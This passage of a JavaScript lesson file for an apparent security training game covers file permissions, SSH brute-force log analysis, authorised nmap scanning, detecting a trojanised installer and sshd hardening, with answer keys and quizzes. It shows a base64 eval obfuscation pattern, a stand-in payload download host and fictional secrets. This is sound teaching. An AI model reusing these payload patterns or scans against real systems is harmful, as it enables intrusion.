  debrief:'<p>Evidence beats opinions: a traceroute with timestamps showing our hops are healthy, plus the partner\'s own status page, settles "it\'s your network". <code>mtr</code> combines ping and traceroute over time and is great for intermittent loss. On Windows the command is <code>tracert</code>. Next step: open a ticket with the partner and attach your traceroute.</p>',
},
/* -------------------------------------------------------------- SEC-201 */
{
  id:'sec-1', track:'sec', code:'SEC-201', title:'Permissions that leak', host:'hf-app03', cwd:'/srv/app', xp:140,
  from:'Weekly security scan · 02:05',
  ticket:'Audit flagged /srv/app on hf-app03: a secrets file readable by every user, an upload folder anyone can write to, and the deploy script won\'t run. Fix the permissions and ship tonight\'s deploy.',
  concept:`<p>Every file has an <strong>owner</strong>, a <strong>group</strong>, and three sets of permissions: for the owner (u), the group (g) and everyone else, the others (o). Each set has <strong>r</strong> read = 4, <strong>w</strong> write = 2 and <strong>x</strong> execute = 1. Add them up per set: rw- = 6, r-- = 4, rwx = 7. So <code>640</code> means owner read/write, group read, others nothing.</p>
<p>On a <strong>directory</strong>, r lets you list names, w lets you create and delete files inside it, and x lets you enter it. A directory with <code>777</code> lets any user, including a compromised web process, drop or delete files there.</p>
<p><code>ls -l</code> shows all of this. The first character is the type (<code>-</code> file, <code>d</code> directory), then three rwx triplets, then owner and group. Least privilege means giving each file only the access it needs.</p>`,
  diagram:`   -  rw-  r--  r--   ops ops   .env
   │  └u┘  └g┘  └o┘
   │   6    4    4    =  644   → every user on the box can read your secrets
  type                         chmod 600 .env  →  -rw-------
  600 secrets · 644 normal files · 755 scripts & dirs · 777 almost never`,
  cmds:[['ls -la', 'Long listing including hidden dotfiles'], ['chmod 600 FILE', 'Set permissions with octal digits'], ['chmod u+x FILE', 'Add execute for the owner (symbolic form)'], ['./script.sh', 'Run a script in the current directory']],
  files:() => ({
    '/srv/app/.env':{ content:J('# tracker production settings', 'DATABASE_URL=postgres://tracker:Wy9!qz2Lm@127.0.0.1:5432/tracker', 'SESSION_SECRET=5b8e0c71d2a94f3e9c6a1b7d', 'S3_BUCKET=hf-tracker-uploads'), mode:'644' },
    '/srv/app/deploy.sh':{ content:J('#!/usr/bin/env bash', 'set -euo pipefail', 'echo "→ pulling release"', 'git -C /srv/app pull --ff-only', 'echo "→ migrating database"', 'npm run migrate', 'sudo systemctl restart tracker'), mode:'644' },
    '/srv/app/server.js':J('const app = require("./app");', 'app.listen(3000);'), '/srv/app/package.json':J('{ "name": "tracker", "version": "3.2.1" }'),
    '/srv/app/uploads/':{ mode:'777' }, '/srv/app/uploads/manifest-88213.pdf':'%PDF-1.7 (shipping manifest)',
  }),
  net:() => stdNet('10.20.4.33', 24, '10.20.4.1'),
  setup:S => { S.scripts['/srv/app/deploy.sh'] = S2 => { const env = getNode(S2, '/srv/app/.env'); const warn = env && /[4-7]$/.test(env.mode) ? `\n${C.y}WARNING: .env is readable by other users (mode ${env.mode})${C.x}` : ''; return ok(`→ pulling release 2026.11.10-1\nAlready up to date.\n→ migrating database\n  ✓ 20261109_add_eta_index\n→ restarting tracker\n${C.g}✓ deployed tracker 3.2.1 at ${shiftTime()} UTC${C.x}${warn}`); }; },
  objectives:[
    { text:'List everything in /srv/app, hidden files included, with owners and permissions: `ls -la`', check:okOn('ls', (ev, S) => ev.args.some(a => /^-\w*a/.test(a)) && ev.args.some(a => /^-\w*l/.test(a)) && (ev.args.filter(a => !a.startsWith('-')).map(a => norm(S, a))[0] || S.cwd) === '/srv/app') },
    { text:'Make `.env` readable and writable by its owner only', check:st(S => (getNode(S, '/srv/app/.env') || {}).mode === '600') },
    { text:'Stop other users from writing into `uploads/`', check:st(S => { const n = getNode(S, '/srv/app/uploads'); return n && !(+n.mode[2] & 2) && (+n.mode[0] & 7) === 7; }) },
    { text:'Give `deploy.sh` execute permission for its owner (and nobody gets write except the owner)', check:st(S => { const n = getNode(S, '/srv/app/deploy.sh'); return n && (+n.mode[0] & 1) && !(+n.mode[1] & 2) && !(+n.mode[2] & 2); }) },
    { text:'Ship it: run `./deploy.sh`', check:okOn('./deploy.sh') },
  ],
  onEvent:(S, ev) => { if (ev.name === '/srv/app/deploy.sh' || (ev.name.includes('deploy.sh') && ev.code === 0)) ev.name = './deploy.sh'; },
  hints:['`ls -la` shows `.env` as `-rw-r--r--` (644) and `uploads` as `drwxrwxrwx` (777).', '`chmod 600 .env` gives rw for the owner only. `chmod 755 uploads` removes write for group and others.', '`chmod 755 deploy.sh` (or `chmod u+x deploy.sh`), then `./deploy.sh`.'],
  quiz:[
    { q:'What does chmod 640 give?', o:['Owner rw, group r, others nothing', 'Owner r, group rw, others nothing', 'Everyone read', 'Owner rwx, group r'], a:0, why:'6 = 4 + 2 (rw) for the owner, 4 (r) for the group, 0 for others.' },
    { q:'On a directory, which permission lets a user create or delete files inside it?', o:['r', 'w', 'x', 'None, only root can'], a:1, why:'Deleting a file is a change to the directory, so it is governed by the directory\'s w bit, not the file\'s.' },
  ],
  debrief:'<p>Real-world follow-ups: <code>chown</code> changes owner and group; a umask (e.g. 027) sets safer defaults for new files; and secrets are better kept in a secret manager (Vault, AWS Secrets Manager) than in a dotfile. Upload folders should also never be executable or served as code. Least privilege applies to people, services and files alike.</p>',
},
/* -------------------------------------------------------------- SEC-202 */
{
  id:'sec-2', track:'sec', code:'SEC-202', title:'Someone is knocking on SSH', host:'hf-bastion', cwd:HOME, xp:180,
  from:'Alerting · 02:09',
  ticket:'hf-bastion: SSH authentication failures are up 40× in the last hour. Find out who\'s knocking and block the worst offender at the firewall.',
  concept:`<p>Logs are the record of what happened. On Ubuntu, SSH logins (good and bad) go to <code>/var/log/auth.log</code>. A <strong>brute-force attack</strong> looks like many failed passwords from one address in a short time, usually trying common usernames.</p>
<p>Pipes let you answer questions about logs in one line. Each tool does one job and passes text to the next: <code>grep</code> filters lines, <code>grep -oE</code> extracts just the matching part (like an IP), <code>sort</code> groups identical lines together, <code>uniq -c</code> counts adjacent duplicates, and <code>sort -nr</code> puts the biggest count first.</p>
<p><strong>ufw</strong> (Uncomplicated Firewall) manages Linux packet filtering. Rules are checked <strong>top to bottom and the first match wins</strong>. A <code>deny from X</code> appended below an existing <code>allow 22/tcp</code> never fires for SSH traffic. Put it on top with <code>ufw insert 1</code>.</p>`,
  diagram:`  auth.log ─▶ grep "Failed password" ─▶ grep -oE "from [0-9.]+" ─▶ sort ─▶ uniq -c ─▶ sort -nr
   ~200 lines     only failures             just "from <ip>"        group   count    biggest first

  ufw:  [1] DENY  from 185.x   ◀── checked first: attacker dropped
        [2] ALLOW 22/tcp        ◀── everyone else still gets SSH`,
  cmds:[['tail -n 20 FILE', 'Last lines of a log'], ['grep -c PATTERN FILE', 'Count matching lines'], ['… | sort | uniq -c | sort -nr', 'Top-N counting recipe'], ['sudo ufw status numbered', 'Firewall rules with positions'], ['sudo ufw insert 1 deny from IP', 'Add a rule at the top']],
  files:() => ({ '/var/log/auth.log':{ content:makeAuthLog(), mode:'640', owner:'ops' } }),
  net:() => stdNet('10.20.4.10', 24, '10.20.4.1'),
  setup:S => { S.fw = { enabled:true, rules:[{ action:'ALLOW', to:'22/tcp', from:'Anywhere' }, { action:'ALLOW', to:'443/tcp', from:'Anywhere' }] }; },
  objectives:[
    { text:'Look at the end of `/var/log/auth.log`', check:(S, ev) => !!ev && ['tail', 'cat', 'less', 'head', 'more', 'grep'].includes(ev.name) && ev.args.some(a => /auth\.log/.test(a)) && ev.code !== 2 },
    { text:'Submit the total number of failed password attempts in the log', answer:S => [String((getNode(S, '/var/log/auth.log').content.match(/Failed password/g) || []).length)], explain:'Counting "Failed password" lines counts attempts. Counting lines that contain an IP would count each attempt three or four times.' },
    { text:'Submit the IP address with the most failed attempts', answer:['185.220.101.47'] },
    { text:'Check the current firewall rules: `sudo ufw status numbered`', check:okOn('ufw', ev => ev.args[0] === 'status') },
    { text:'Block that IP so the rule actually takes effect for SSH (it must sit above the SSH allow rule)', check:st(S => { const r = S.fw.rules; const d = r.findIndex(x => x.action !== 'ALLOW' && x.from === '185.220.101.47'); const a = r.findIndex(x => x.action === 'ALLOW' && /^(22|Anywhere|OpenSSH)/.test(x.to) && x.from === 'Anywhere'); return d >= 0 && (a < 0 || d < a); }) },
  ],
  coach:(S, line) => { if (!/ufw\s+(deny|reject)/.test(line) || /insert/.test(line)) return null; const r = S.fw.rules; const d = r.findIndex(x => x.action !== 'ALLOW' && x.from === '185.220.101.47'); const a = r.findIndex(x => x.action === 'ALLOW' && x.to === '22/tcp'); return d > a && a >= 0 ? `Rule added, but at position ${d + 1}, below "ALLOW 22/tcp" at ${a + 1}. First match wins, so SSH from that IP is still allowed. Delete it (sudo ufw delete ${d + 1}) and use: sudo ufw insert 1 deny from 185.220.101.47` : null; },
  hints:['`grep -c "Failed password" /var/log/auth.log` counts the attempts.', 'Top attacker: `grep "Failed password" /var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -nr`', 'Use `sudo ufw insert 1 deny from <ip>` so the deny rule is checked before "ALLOW 22/tcp".'],
  quiz:[
    { q:'In `grep Failed auth.log | sort | uniq -c`, why is sort needed before uniq?', o:['uniq only merges duplicates that are next to each other', 'uniq needs alphabetical input to run', 'sort removes errors', 'It isn\'t needed'], a:0, why:'Without sorting, the same IP appearing in separate places would be counted as separate groups.' },
    { q:'ufw has [1] ALLOW 22/tcp and [2] DENY from 185.220.101.47. Can that IP still reach SSH?', o:['No, deny always wins', 'Yes, the first matching rule (allow) wins', 'Only if ufw is disabled', 'Only over IPv6'], a:1, why:'ufw (iptables) evaluates rules in order and stops at the first match.' },
  ],
  debrief:'<p>Blocking one IP is whack-a-mole; attackers rotate addresses. Lasting fixes: <strong>disable password logins</strong> entirely (SEC-205), allow SSH only from the VPN or office ranges, and let <code>fail2ban</code> or CrowdSec ban noisy IPs automatically. 185.220.101.0/24 is a well-known Tor exit range, which is another hint this was automated scanning.</p>',
},
/* -------------------------------------------------------------- SEC-203 */
{
  id:'sec-3', track:'sec', code:'SEC-203', title:'Authorised scan: the camera VLAN', host:'hf-sec01', cwd:HOME, xp:170,
  from:'Lena Vogt, Security Lead · 02:12',
  ticket:'Authorised audit, change SEC-4471: inventory the warehouse camera VLAN 10.0.5.0/24 from hf-sec01. We suspect legacy gear using cleartext protocols. Scan only that range.',
  concept:`<p>Port scanning asks every port on a host "are you open?". For TCP, the scanner sends a SYN. A <strong>SYN/ACK</strong> reply means <strong>open</strong> (something is listening), an <strong>RST</strong> means <strong>closed</strong> (the host is up but nothing is there), and <strong>silence</strong> means <strong>filtered</strong> (a firewall dropped the probe).</p>
<p><code>nmap</code> works in stages: host discovery (<code>-sn</code>: which hosts are up, no port scan), a port scan (the top 1,000 TCP ports by default), and optionally <code>-sV</code>, which probes open ports to identify the software and version. Versions are what you check against known vulnerabilities.</p>
<p><strong>Cleartext protocols</strong> such as Telnet (23), FTP (21) and plain HTTP (80) send everything unencrypted, passwords included, so anyone on the path can read them. Replace them with SSH, SFTP and HTTPS. Only ever scan networks you own or are explicitly authorised to test.</p>`,
  diagram:`  open      SYN ─▶          ◀─ SYN/ACK     service listening
  closed    SYN ─▶          ◀─ RST         host up, port shut
  filtered  SYN ─▶          ... silence    a firewall dropped it

  nmap -sn 10.0.5.0/24   → who is up?
  nmap 10.0.5.0/24       → which ports are open?
  nmap -sV 10.0.5.31     → what software, which version?`,
  cmds:[['nmap -sn CIDR', 'Ping sweep: list live hosts'], ['nmap TARGET', 'Scan the top 1,000 TCP ports'], ['nmap -sV TARGET', 'Detect service names and versions'], ['nmap -p 22,80 TARGET', 'Scan only specific ports']],
  files:() => ({ '/home/ops/SCOPE.txt':J('Change SEC-4471 — authorised by L. Vogt', 'In scope:     10.0.5.0/24 (camera VLAN)', 'Out of scope: everything else', 'Window:       02:00–04:00 UTC') }),
  net:() => stdNet('10.0.5.10', 24, '10.0.5.1', { hosts:{
    '10.0.5.1':{ name:'gw-cam.halcyon.lan', mac:'52:54:00:00:05:01 (QEMU virtual NIC)', ports:{ 53:{ svc:'domain', ver:'dnsmasq 2.90' } } },
    '10.0.5.12':{ name:'nvr01.halcyon.lan', mac:'00:0C:29:4E:12:9A (VMware)', ports:{ 22:{ svc:'ssh', ver:'OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)' }, 443:{ svc:'ssl/http', ver:'nginx 1.24.0 (Ubuntu)' } }, os:'OS: Linux; CPE: cpe:/o:linux:linux_kernel' },
    '10.0.5.23':{ name:'cam-ctrl.halcyon.lan', mac:'B8:27:EB:61:0A:23 (Raspberry Pi Foundation)', ports:{ 22:{ svc:'ssh', ver:'OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)' }, 8554:{ svc:'rtsp-alt', ver:'Live555 Streaming Media 2023.11.30' } } },
    '10.0.5.31':{ mac:'00:12:12:A0:31:7C (Hikvision Digital Technology)', ports:{ 23:{ svc:'telnet', ver:'BusyBox telnetd 1.19.4' }, 80:{ svc:'http', ver:'lighttpd 1.4.35' } }, os:'Host: DVR-4CH; OS: Linux; Device: webcam' },
    '10.0.5.40':{ name:'ws-security.halcyon.lan', mac:'3C:52:82:7F:40:11 (Hewlett Packard)', ports:{ 445:{ svc:'microsoft-ds?', ver:'' }, 3389:{ svc:'ms-wbt-server', ver:'Microsoft Terminal Services' } }, os:'OS: Windows; CPE: cpe:/o:microsoft:windows' },
  } }),
  setup:S => { delete S.net.hosts['10.0.0.53']; delete S.net.hosts['1.1.1.1']; },
  scope:spec => { if (/^[\d.]+\/\d+$/.test(spec)) { const [b, bits] = spec.split('/'); return +bits >= 24 && inCidr(b, '10.0.5.0/24'); } return isIP(spec) ? inCidr(spec, '10.0.5.0/24') : /halcyon\.lan$/.test(spec) && false; },
  scopeText:'10.0.5.0/24 (see ~/SCOPE.txt)',
  objectives:[
    { text:'Read the rules of engagement: `cat SCOPE.txt`', check:okOn('cat', ev => ev.args.some(a => /SCOPE/.test(a))) },
    { text:'Discover live hosts with a ping sweep: `nmap -sn 10.0.5.0/24`', check:okOn('nmap', ev => ev.meta.sweep && /\/24$/.test(ev.meta.spec || '')) },
    { text:'Submit how many hosts are up (including yours)', answer:['6'] },
    { text:'Port-scan the whole range: `nmap 10.0.5.0/24`', check:okOn('nmap', ev => !ev.meta.sweep && /\/24$/.test(ev.meta.spec || '')) },
    { text:'Submit the IP of the device that offers Telnet', answer:['10.0.5.31'] },
    { text:'Version-scan that device and submit the name of its web server software', answer:['lighttpd', 'lighttpd 1.4.35'], explain:'lighttpd 1.4.35 dates from 2014 and has known CVEs: firmware this old is the real finding.' },
  ],
  hints:['The sweep ends with "(N hosts up)". Submit N.', 'In the full scan, look for `23/tcp open telnet` and read the "Nmap scan report for …" line above it.', '`nmap -sV 10.0.5.31` shows `80/tcp open http lighttpd 1.4.35`. Submit `lighttpd`.'],
  quiz:[
    { q:'nmap reports a port as "filtered". What most likely happened?', o:['The service crashed', 'A firewall dropped the probes, so there was no reply at all', 'The port is open but slow', 'The host is down'], a:1, why:'Closed ports answer with RST. Filtered means nmap got silence, the signature of a dropping firewall.' },
    { q:'Why is Telnet on a device a security finding?', o:['It is slow', 'It sends logins and everything else in cleartext', 'It uses UDP', 'It only works on Windows'], a:1, why:'Anyone who can sniff the network can read Telnet credentials. SSH encrypts the same job.' },
  ],
  debrief:'<p>Report what you found, what it means and what to do. Here: an old DVR with Telnet and a 2014-era web server. Recommendations: move it to an isolated VLAN with no inbound access, disable Telnet, change default credentials, update or replace the firmware, and add a firewall rule so only the NVR can reach it. Running a scan you are not authorised for is illegal in many countries, even "just to look".</p>',
},
/* -------------------------------------------------------------- SEC-204 */
{
  id:'sec-4', track:'sec', code:'SEC-204', title:'Trust, but verify the download', host:'hf-ops02', cwd:'/home/ops/downloads', xp:170,
  from:'Build bot · 02:16',
  ticket:'We pulled monitoring agent v2.4.1 from three mirrors because the vendor\'s site was slow. Before anyone runs it with sudo, verify the copies against the vendor\'s published checksum.',
  concept:`<p>A <strong>hash function</strong> turns any data into a short, fixed-size fingerprint. SHA-256 always produces 64 hex characters, and changing a single byte of the input changes the hash completely. Vendors publish the hash of each release. If your download hashes to the same value, it is byte-for-byte identical to what they hashed. Hashing is <strong>one-way</strong>: you cannot rebuild a file from its hash.</p>
<p><strong>Encoding is not encryption.</strong> Base64 just rewrites bytes as letters and digits so they survive email or JSON. Anyone can decode it, and no key is involved. Attackers use it to hide commands from a quick skim, as in <code>eval "$(echo … | base64 -d)"</code>.</p>
<p>A hash only tells you a file matches the published value. If an attacker can change both the file and the checksum on the same server, the check proves nothing. That is why serious projects also <strong>sign</strong> releases (GPG, Sigstore).</p>`,
  diagram:`  hashing     sha256sum file   one-way fingerprint   no key    "is it identical?"
  encoding    base64           reversible            no key    "make it text-safe"
  encryption  gpg / TLS        reversible            needs key "keep it secret"

  vendor: 4f1c…e9  agent-2.4.1.sh
  mirror-a  4f1c…e9  ✓   mirror-b  9b07…3a  ✗   mirror-c  4f1c…e9  ✓`,
  cmds:[['sha256sum FILE…', 'Print SHA-256 hashes (globs work: mirror-*/…)'], ['sha256sum -c LIST', 'Check files against a list of hashes'], ['grep PATTERN FILE', 'Find the suspicious line'], ['echo "…" | base64 -d', 'Decode Base64 text (safe, it only prints)']],
  files:() => ({
    '/home/ops/downloads/SHA256SUMS':`${sha256(AGENT)}  agent-2.4.1.sh\n`,
    '/home/ops/downloads/mirror-a/agent-2.4.1.sh':AGENT, '/home/ops/downloads/mirror-b/agent-2.4.1.sh':AGENT_BAD, '/home/ops/downloads/mirror-c/agent-2.4.1.sh':AGENT,
    '/home/ops/downloads/MIRRORS.txt':J('mirror-a  https://mirror.fra.beacon-telemetry.example/releases/2.4.1/', 'mirror-b  https://beacon-mirror.download-fast.example/2.4.1/', 'mirror-c  https://mirror.ams.beacon-telemetry.example/releases/2.4.1/'),
  }),
  net:() => stdNet('10.20.4.41', 24, '10.20.4.1'),
  setup:S => { S.flags.hashed = new Set(); const coach = () => ok(`${C.y}coach › You just ran an installer you haven't verified. In real life its hidden payload would now be running as you. Verify first, run later.${C.x}`); ['a', 'b', 'c'].forEach(m => S.scripts[`/home/ops/downloads/mirror-${m}/agent-2.4.1.sh`] = coach); },
  onEvent:(S, ev) => { if (ev.name === 'sha256sum') (ev.meta.files || []).forEach(f => S.flags.hashed.add(f)); },
  objectives:[
    { text:'Read the vendor\'s published checksum: `cat SHA256SUMS`', check:okOn('cat', ev => ev.args.some(a => /SHA256SUMS/.test(a))) },
    { text:'Hash all three downloaded copies with `sha256sum`', check:st(S => ['a', 'b', 'c'].every(m => S.flags.hashed.has(`/home/ops/downloads/mirror-${m}/agent-2.4.1.sh`) || (m === 'b' && !getNode(S, '/home/ops/downloads/mirror-b/agent-2.4.1.sh')))) },
    { text:'Submit the mirror whose copy does NOT match (e.g. `submit mirror-x`)', answer:['mirror-b', 'b', 'mirror b', 'mirror-b/agent-2.4.1.sh', 'beacon-mirror.download-fast.example'] },
    { text:'Find the hidden line in the bad copy and decode its Base64 with `base64 -d`', check:okOn('base64', ev => /cdn-agent-update/.test(ev.out)) },
    { text:'Submit the domain the hidden payload would download from', answer:['cdn-agent-update.example'] },
    { text:'Delete the tampered copy so nobody runs it by mistake', check:st(S => !getNode(S, '/home/ops/downloads/mirror-b/agent-2.4.1.sh')) },
  ],
  hints:['`sha256sum mirror-*/agent-2.4.1.sh` hashes all three at once. Compare each with SHA256SUMS.', '`grep -n base64 mirror-b/agent-2.4.1.sh` shows the hidden eval line.', 'Copy the quoted text and run `echo \'PASTE\' | base64 -d`. Afterwards: `rm mirror-b/agent-2.4.1.sh`.'],
  quiz:[
    { q:'Your file\'s SHA-256 matches the vendor\'s published value. What does that prove?', o:['The vendor is trustworthy', 'Your file is byte-for-byte identical to the file the vendor hashed', 'The file has no malware', 'The file is encrypted'], a:1, why:'A hash proves integrity (identical bytes), not intent. A signature additionally proves who published it.' },
    { q:'A config stores a password as Base64. How safe is that?', o:['Safe, it is encrypted', 'Safe if the string is long', 'Not safe: anyone can decode it, since there is no key', 'Safe on Linux only'], a:2, why:'Base64 is an encoding. `base64 -d` reverses it instantly.' },
  ],
  debrief:'<p>Mirror B was a look-alike domain serving a trojanised installer. In the real world: report it to the vendor, block the domain, and check whether any machine already ran it by searching shell history and proxy logs for <code>cdn-agent-update</code>. Prefer the vendor\'s signed packages (apt repositories verify GPG signatures automatically), and pin hashes in your automation.</p>',
},
/* -------------------------------------------------------------- SEC-205 */
{
  id:'sec-5', track:'sec', code:'SEC-205', title:'Lock down SSH without locking yourself out', host:'hf-bastion', cwd:HOME, xp:190,
  from:'Lena Vogt, Security Lead · 02:22',
  ticket:'After tonight\'s brute-force attempt on hf-bastion: no root logins over SSH, and no passwords, keys only. Don\'t lock us out.',
  concept:`<p>SSH gives you a remote shell over an encrypted channel. You can authenticate with a <strong>password</strong>, which can be guessed or phished, or a <strong>key pair</strong>: a private key that never leaves your laptop and a public key listed in <code>~/.ssh/authorized_keys</code> on the server. With passwords disabled, brute force like SEC-202 becomes pointless.</p>
<p>Root logins over SSH are risky: one leaked credential gives full control, and the logs cannot tell which admin it was. Log in as yourself and use <code>sudo</code>.</p>
<p>The trap: sshd reads <code>/etc/ssh/sshd_config</code> top to bottom, and for most settings <strong>the first value it sees wins</strong>. An <code>Include</code> line pulls in the drop-in files right where it appears, so a file in <code>sshd_config.d/</code> can silently override what you write further down. <code>sshd -T</code> prints the <em>effective</em> settings. Always test with <code>sshd -t</code> before restarting, and keep your current session open until a new login works.</p>`,
  diagram:`  /etc/ssh/sshd_config
   line 12  Include /etc/ssh/sshd_config.d/*.conf ──▶ 50-cloud-init.conf
                                                         PasswordAuthentication yes  ◀ read FIRST, wins
   line 40  PasswordAuthentication no                    ◀ ignored!
  safe order:  check key ▸ edit ▸ sshd -t ▸ restart ▸ test new login ▸ close old session`,
  cmds:[['cat ~/.ssh/authorized_keys', 'Keys allowed to log in as you'], ['sudo nano /etc/ssh/sshd_config', 'Edit the main config'], ['ls /etc/ssh/sshd_config.d/', 'Drop-in files pulled in by Include'], ['sudo sshd -T | grep -i auth', 'Effective settings after includes'], ['sudo sshd -t', 'Validate the config'], ['sudo systemctl restart ssh', 'Apply it']],
  files:() => ({
    '/home/ops/.ssh/authorized_keys':{ content:'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGm3kq8wXbE5o2vR1pL9dT7cY4hZsN0aK6fU3jQ8rW1x ops@laptop-night\n', mode:'600' },
    '/etc/ssh/sshd_config':J('# This is the sshd server system-wide configuration file.  See', '# sshd_config(5) for more information.', '', '# The strategy used for options in the default sshd_config shipped with', '# OpenSSH is to specify options with their default value where', '# possible, but leave them commented.  Uncommented options override the', '# default value.', '', '# Halcyon: drop-in files are read first (first value wins)', '', '',
      'Include /etc/ssh/sshd_config.d/*.conf', '', '#Port 22', '#AddressFamily any', '#ListenAddress 0.0.0.0', '', '# Authentication:', '', '#LoginGraceTime 2m', 'PermitRootLogin yes', '#StrictModes yes', '#MaxAuthTries 6', '#MaxSessions 10', '', 'PubkeyAuthentication yes', '', '# Expect .ssh/authorized_keys2 to be disregarded by default in future.', '#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2', '', '# To disable tunneled clear text passwords, change to no here!', 'PasswordAuthentication yes', '#PermitEmptyPasswords no', '', 'KbdInteractiveAuthentication no', '', 'UsePAM yes', '', 'X11Forwarding yes', 'PrintMotd no', '', '# Allow client to pass locale environment variables', 'AcceptEnv LANG LC_*', '', '# override default of no subsystems', 'Subsystem	sftp	/usr/lib/openssh/sftp-server'),
    '/etc/ssh/sshd_config.d/50-cloud-init.conf':'PasswordAuthentication yes\n',
  }),
  net:() => stdNet('10.20.4.10', 24, '10.20.4.1'),
  setup:S => {
    const svc = { name:'ssh', aliases:['sshd'], desc:'OpenBSD Secure Shell server', proc:'sshd', state:'active', enabled:true, since:'00:02:11', pid:588, logs:[`Nov 10 00:02:11 hf-bastion systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...`, `Nov 10 00:02:11 hf-bastion sshd[588]: Server listening on 0.0.0.0 port 22.`, `Nov 10 00:02:11 hf-bastion systemd[1]: Started ssh.service - OpenBSD Secure Shell server.`], loaded:null,
      test:S2 => { const p = sshdParse(S2); return p.errs.length ? { ok:false, lines:p.errs } : { ok:true }; },
      onStart:S2 => { svc.loaded = sshdParse(S2).eff; } };
    svc.loaded = { permitrootlogin:'yes', passwordauthentication:'yes' };
    S.services.ssh = svc; S.procs = S.procs.filter(p => p.name !== 'sshd');
    S.procs.push({ pid:588, user:'root', name:'sshd', cmd:'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups', listen:[{ p:'tcp', a:'0.0.0.0', port:22 }] });
  },
  objectives:[
    { text:'Before disabling passwords, confirm a key is installed for ops: `cat ~/.ssh/authorized_keys`', check:okOn('cat', ev => ev.args.some(a => /authorized_keys/.test(a))) },
    { text:'Turn off root login (effective `PermitRootLogin no`)', check:st(S => sshdParse(S).eff.permitrootlogin === 'no') },
    { text:'Turn off password logins (effective `PasswordAuthentication no`), including any drop-in file', check:st(S => sshdParse(S).eff.passwordauthentication === 'no') },
    { text:'Validate the configuration: `sudo sshd -t` prints nothing on success', check:okOn('sshd', (ev, S) => ev.meta.test && sshdParse(S).eff.passwordauthentication === 'no' && sshdParse(S).eff.permitrootlogin === 'no') },
    { text:'Apply it: restart the SSH service', check:st(S => S.services.ssh.state === 'active' && S.services.ssh.loaded.permitrootlogin === 'no' && S.services.ssh.loaded.passwordauthentication === 'no') },
  ],
  hints:['Edit with `sudo nano /etc/ssh/sshd_config`: set `PermitRootLogin no` and `PasswordAuthentication no`.', 'Still says yes? Run `sudo sshd -T | grep -i password`. The Include on line 12 pulls in `/etc/ssh/sshd_config.d/50-cloud-init.conf`, which is read first. Fix it there too.', '`sudo nano /etc/ssh/sshd_config.d/50-cloud-init.conf` → `PasswordAuthentication no`. Then `sudo sshd -t` and `sudo systemctl restart ssh`.'],
  quiz:[
    { q:'sshd_config line 12 includes a drop-in with "PasswordAuthentication yes"; line 40 says "no". What is the effective value?', o:['no, the last one wins', 'yes, the first value sshd reads wins', 'It refuses to start', 'Whichever is in the bigger file'], a:1, why:'For most sshd options the first obtained value is used. That is why `sshd -T` exists.' },
    { q:'Why run `sshd -t` before restarting?', o:['It makes the restart faster', 'A broken config can stop sshd from starting, and on a remote box that locks everyone out', 'It is required by law', 'It reloads keys'], a:1, why:'Test first, keep your current session open, and verify a new login before you disconnect.' },
  ],
  debrief:'<p>Defence in depth: keys only and no root login, plus SEC-202\'s firewall and fail2ban, plus allowing SSH only from the VPN. Going further: <code>AllowUsers</code> or <code>AllowGroups</code> to limit who may log in, and SSH certificates or hardware keys (FIDO2, <code>ed25519-sk</code>). Cloud images often ship drop-ins like 50-cloud-init.conf, so always check the effective config, not just the file you edited.</p>',
},
/* -------------------------------------------------------------- OPS-301 */
{
  id:'ops-1', track:'ops', code:'OPS-301', title:'Fix it on a branch: Git basics', host:'hf-dev01', cwd:'/home/ops/status-page', xp:150,
  from:'Marketing · 02:25',
  ticket:'The public status page says "Halcyon Frieght" in the title and the footer. Customers are screenshotting it. Fix it on a branch called fix/footer-typo and push it for review. Don\'t commit my draft incident notes!',
  concept:`<p>Git records <strong>snapshots</strong> of a project over time. Your changes pass through three places. The <strong>working directory</strong> is the files you edit. The <strong>staging area</strong> (index) is what will go into the next snapshot. The <strong>repository</strong> is the history of committed snapshots.</p>
<p><code>git add</code> copies changes into staging, <code>git commit</code> saves the staged snapshot with a message, and <code>git status</code> tells you what is where. Staging lets you commit only the files you mean to.</p>
<p>A <strong>branch</strong> is a movable label pointing at a commit. Working on a branch keeps <code>main</code> deployable while your fix is reviewed. <code>git push</code> sends your branch to the shared remote (here GitHub), where it becomes a pull request.</p>`,
  diagram:`  working dir ──git add──▶ staging ──git commit──▶ local repo ──git push──▶ origin (GitHub)
   (you edit)             (next snapshot)       (history)                  (team review)

  main             ●───●───●
                            ╲
  fix/footer-typo            ●  ← your commit`,
  cmds:[['git status', 'What changed and what is staged'], ['git switch -c NAME', 'Create a branch and move to it (also: git checkout -b)'], ['sed -i \'s/old/new/g\' FILE', 'Find and replace in a file'], ['git diff', 'Line-by-line changes not yet staged'], ['git add FILE', 'Stage one file'], ['git commit -m "msg"', 'Commit what is staged'], ['git push -u origin NAME', 'Publish the branch']],
  files:() => ({
    '/home/ops/status-page/index.html':J('<!doctype html>', '<html lang="en">', '<head>', '  <meta charset="utf-8">', '  <title>Halcyon Frieght — System Status</title>', '  <link rel="stylesheet" href="style.css">', '</head>', '<body>', '  <h1>All systems operational</h1>', '  <ul class="components">', '    <li>Shipment tracking <span class="ok">Operational</span></li>', '    <li>Customer portal <span class="ok">Operational</span></li>', '    <li>Partner API <span class="warn">Degraded</span></li>', '  </ul>', '  <footer>© 2026 Halcyon Frieght Ltd · Status page</footer>', '</body>', '</html>'),
    '/home/ops/status-page/style.css':J('body { font-family: system-ui; margin: 2rem; }', '.ok { color: #1a7f37; }', '.warn { color: #9a6700; }'),
    '/home/ops/status-page/README.md':J('# status-page', '', 'Static status page for status.halcyon.lan. Deployed from `main` by CI.'),
    '/home/ops/status-page/incident-notes.md':J('DRAFT — do not publish', '', '01:40 partner API down. Suspect their FRA DC.', 'Possible credits for Acme Retail?? check contract'),
    '/home/ops/status-page/.git/HEAD':'ref: refs/heads/main\n',
  }),
  net:() => stdNet('10.20.4.45', 24, '10.20.4.1'),
  setup:S => {
    const root = '/home/ops/status-page'; const tree = {};
    for (const f of ['index.html', 'style.css', 'README.md']) tree[f] = getNode(S, root + '/' + f).content;
    const t1 = { ...tree, 'index.html':tree['index.html'].replace('    <li>Partner API <span class="warn">Degraded</span></li>\n', '') };
    const id = s => sha256(s).slice(0, 40);
